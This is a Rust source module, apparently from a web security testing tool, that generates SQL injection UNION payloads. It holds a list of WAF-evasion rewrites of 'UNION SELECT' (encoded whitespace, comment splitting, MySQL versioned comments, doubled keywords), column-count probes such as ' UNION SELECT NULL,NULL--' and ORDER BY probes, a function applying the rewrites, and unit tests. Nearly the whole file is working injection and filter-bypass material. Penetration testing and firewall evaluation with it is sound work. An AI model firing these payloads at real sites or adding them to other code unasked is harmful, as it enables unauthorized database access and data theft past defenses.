//! UNION-specific SQL mutation helpers.
//!
//! Provides comprehensive UNION injection variants including keyword
//! obfuscation, column-count bruteforcing, and WAF-specific evasion
//! techniques. The key insight: WAFs typically regex for `UNION\s+SELECT`
//! — splitting that pattern across comments, newlines, or encoding
//! boundaries defeats the regex without changing SQL semantics.

use crate::grammar::sql::common::SqlMutation;

/// Alternate `UNION ... SELECT` spellings.
///
/// Ordered from most likely to succeed (simple whitespace substitution)
/// to most aggressive (MySQL versioned comments).
pub(crate) const UNION_ALTERNATIVES: &[&str] = &[
    // Basic whitespace substitution
    "UNION SELECT",
    "UNION ALL SELECT",
    "UNION DISTINCT SELECT",
    // Whitespace evasion — tabs, newlines, carriage returns
    "UNION%0ASELECT",
    "UNION%09SELECT",
    "UNION%0D%0ASELECT",
    "UNION%0BSELECT", // Vertical tab
    "UNION%0CSELECT", // Form feed
    "UNION%A0SELECT", // Non-breaking space (Latin-1)
    // Comment-based splitting
    "UNION/**/SELECT",
    "UNION/*foo*/SELECT",
    "UNION/*%00*/SELECT", // Null byte inside comment
    "/*!UNION*/ SELECT",
    "/*!UNION*//*!SELECT*/",
    "UNION/*! SELECT*/",
    // MySQL versioned comments
    "/*!50000UNION*//*!50000SELECT*/",
    "/*!40000UNION*//*!40000ALL*//*!40000SELECT*/",
    "/*!99999UNION*/SELECT",
    // Case mixing + comment
    "UnIoN/**/SeLeCt",
    "uNiOn/**/sElEcT",
    "UnIoN%0AsElEcT",
    // Double keyword (WAF strips first occurrence, second executes)
    "UNUNIONION SESELECTLECT",
    "UNIunionON SELselectECT",
    // Line continuation (MySQL backslash-newline)
    "UNION\\\nSELECT",
    // Parenthesized subquery
    "UNION (SELECT",
    "UNION ALL (SELECT",
];

/// Column count bruteforce payloads for UNION injection.
///
/// UNION requires matching column counts. These probe from 1–25 columns
/// to find the correct count. Returns payloads with NULL placeholders.
pub(crate) fn union_column_probes(max_columns: u32) -> Vec<SqlMutation> {
    let mut results = Vec::new();

    for n in 1..=max_columns.min(25) {
        let nulls: Vec<&str> = vec!["NULL"; n as usize];
        let null_list = nulls.join(",");

        // Basic UNION SELECT NULL,...
        results.push(SqlMutation {
            payload: format!("' UNION SELECT {null_list}--"),
            description: format!("UNION column probe: {n} columns"),
            rules_applied: vec!["union_probe", "column_count"],
        });

        // With comment obfuscation
        results.push(SqlMutation {
            payload: format!("' UNION/**/SELECT {null_list}--"),
            description: format!("UNION column probe (comment): {n} columns"),
            rules_applied: vec!["union_probe", "comment_obfuscation"],
        });

        // ORDER BY probe (binary search approach)
        results.push(SqlMutation {
            payload: format!("' ORDER BY {n}--"),
            description: format!("ORDER BY column probe: {n}"),
            rules_applied: vec!["union_probe", "order_by"],
        });
    }

    results
}

/// Generate UNION-based mutations for an existing payload.
pub(crate) fn union_mutations(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let lower = payload.to_ascii_lowercase();
    let mut results = Vec::new();

    // Only apply if the payload contains UNION
    if !lower.contains("union") {
        return results;
    }

    for alternative in UNION_ALTERNATIVES {
        if results.len() >= max_mutations {
            break;
        }
        if let Some(mutated) = replace_union(payload, alternative)
            && mutated != payload
        {
            results.push(SqlMutation {
                payload: mutated,
                description: format!("UNION alternative: {alternative}"),
                rules_applied: vec!["union_rewrite"],
            });
        }
    }

    results.truncate(max_mutations);
    results
}

/// Replace `UNION ... SELECT` with an alternative form.
pub(crate) fn replace_union(payload: &str, replacement: &str) -> Option<String> {
    let lower = payload.to_ascii_lowercase();
    let union_position = lower.find("union")?;
    let select_position = lower[union_position..].find("select")? + union_position;
    let end_position = select_position + "select".len();

    let mut result = String::with_capacity(payload.len() + replacement.len());
    result.push_str(&payload[..union_position]);
    result.push_str(replacement);
    result.push_str(&payload[end_position..]);
    Some(result)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn union_alternatives_all_contain_union_and_select() {
        for alt in UNION_ALTERNATIVES {
            let decoded = alt
                .replace("%0A", "\n")
                .replace("%09", "\t")
                .replace("%0D", "\r")
                .replace("%0B", "\x0b")
                .replace("%0C", "\x0c")
                .replace("%A0", "\u{00a0}")
                .replace("%00", "\0")
                .to_ascii_lowercase();
            assert!(
                decoded.contains("union") || decoded.contains("ununion"),
                "alternative should contain 'union': {alt}"
            );
        }
    }

    #[test]
    fn replace_union_basic() {
        let result = replace_union("' UNION SELECT 1,2--", "UNION/**/SELECT");
        assert_eq!(result, Some("' UNION/**/SELECT 1,2--".to_string()));
    }

    #[test]
    fn replace_union_case_insensitive() {
        let result = replace_union("' union select 1--", "UNION%0ASELECT");
        assert!(result.is_some());
        assert!(result.unwrap().contains("UNION%0ASELECT"));
    }

    #[test]
    fn column_probes_generates_correct_count() {
        let probes = union_column_probes(5);
        // 3 variants per column count × 5 columns = 15
        assert_eq!(probes.len(), 15);
    }

    #[test]
    fn column_probes_null_count_matches() {
        let probes = union_column_probes(3);
        // Find the basic UNION SELECT for 3 columns
        let three_col = probes
            .iter()
            .find(|p| p.payload.contains("NULL,NULL,NULL") && !p.payload.contains("/**/"))
            .expect("should have 3-column probe");
        assert_eq!(
            three_col.payload.matches("NULL").count(),
            3,
            "should have exactly 3 NULLs"
        );
    }

    #[test]
    fn union_mutations_on_union_payload() {
        let mutations = union_mutations("' UNION SELECT 1,2--", 50);
        assert!(mutations.len() > 5, "should generate multiple alternatives");
    }

    #[test]
    fn union_mutations_on_non_union_payload() {
        let mutations = union_mutations("' OR 1=1--", 50);
        assert!(mutations.is_empty(), "should not mutate non-UNION payloads");
    }

    #[test]
    fn double_keyword_bypass() {
        assert!(
            UNION_ALTERNATIVES.iter().any(|a| a.contains("UNUNIONION")),
            "should include double-keyword bypass"
        );
    }
}
